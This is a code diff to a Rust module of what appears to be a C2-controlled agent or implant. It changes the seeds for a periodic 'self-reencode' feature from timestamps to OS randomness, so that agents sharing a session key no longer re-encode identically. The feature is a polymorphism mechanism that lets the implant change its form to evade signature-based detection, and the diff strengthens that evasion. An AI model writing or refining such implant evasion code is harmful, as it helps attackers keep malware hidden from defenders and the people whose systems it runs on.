@@ -24,9 +24,10 @@
 #![cfg(feature = "self-reencode")]
 
 use anyhow::{Context, Result};
+use rand::RngCore;
 use sha2::{Digest, Sha256};
 use std::sync::atomic::{AtomicU64, Ordering};
-use std::time::{Duration, SystemTime};
+use std::time::Duration;
 
 /// Seed for the next re-encoding pass.  Set by the C2 server via
 /// `Command::SetReencodeSeed`; defaults to a hash of the session key so
@@ -39,22 +40,30 @@ static REENCODE_INTERVAL_SECS: AtomicU64 = AtomicU64::new(DEFAULT_REENCODE_INTER
 /// Default re-encoding interval: 4 hours.
 pub const DEFAULT_REENCODE_INTERVAL_SECS: u64 = 4 * 3600;
 
-/// Derive a non-zero default seed from the session key material.
+/// Derive a non-zero default seed from the session key material mixed with
+/// OS-provided randomness.
 ///
-/// Uses the first 8 bytes of the SHA-256 hash of the session key, ensuring
-/// the re-encode feature is active from the first cycle even before the
-/// C2 server sends `SetReencodeSeed`.
+/// Uses the first 8 bytes of the SHA-256 hash of `(session_key || os_rng_bytes)`,
+/// ensuring the re-encode feature is active from the first cycle even before the
+/// C2 server sends `SetReencodeSeed`.  Mixing in `OsRng` ensures that two agents
+/// sharing the same session key will still produce different seeds.
 ///
 /// Returns the derived seed and a static string indicating the source
 /// ("auto-derived" for this path vs "c2-supplied" for `set_seed`).
 pub fn derive_default_seed(session_key: &[u8; 32]) -> u64 {
     use sha2::Digest;
-    let hash = Sha256::digest(session_key);
+    // P2-11: Mix in OsRng bytes alongside the session key hash.
+    let mut os_bytes = [0u8; 32];
+    rand::rngs::OsRng.fill_bytes(&mut os_bytes);
+    let mut hasher = Sha256::new();
+    hasher.update(session_key);
+    hasher.update(&os_bytes);
+    let hash = hasher.finalize();
     let seed = u64::from_le_bytes(hash[..8].try_into().expect("slice is 8 bytes"));
     // Ensure non-zero
     let seed = if seed == 0 { 1u64 } else { seed };
     log::info!(
-        "self_reencode: auto-derived default seed 0x{seed:016x} from session key"
+        "self_reencode: auto-derived default seed 0x{seed:016x} from session key + OsRng"
     );
     seed
 }
@@ -81,16 +90,19 @@ pub fn set_interval_secs(secs: u64) {
     }
 }
 
-/// Derive a fresh seed from the current timestamp and the C2-provided nonce.
+/// Derive a fresh seed from cryptographically secure random bytes mixed with
+/// the C2-provided nonce.
 ///
 /// This ensures each re-encoding pass produces a unique transformation even
-/// if the server nonce is static.
+/// if the server nonce is static.  The seed is derived from `rand()` bytes
+/// XORed with the server nonce for domain separation.
 pub fn derive_fresh_seed(server_nonce: u64) -> u64 {
-    let ts = SystemTime::now()
-        .duration_since(SystemTime::UNIX_EPOCH)
-        .map(|d| d.as_secs())
-        .unwrap_or(0);
-    let seed = ts ^ server_nonce;
+    use rand::RngCore;
+    let mut seed = [0u8; 8];
+    rand::thread_rng().fill_bytes(&mut seed);
+    let seed_u64 = u64::from_le_bytes(seed);
+    // Mix in server_nonce for domain separation
+    let seed = seed_u64 ^ server_nonce;
     // Ensure the seed is non-zero (zero would produce the same output
     // regardless of input — ChaCha8RNG with zero seed is still valid but
     // using a non-zero value avoids the degenerate "always same" case if
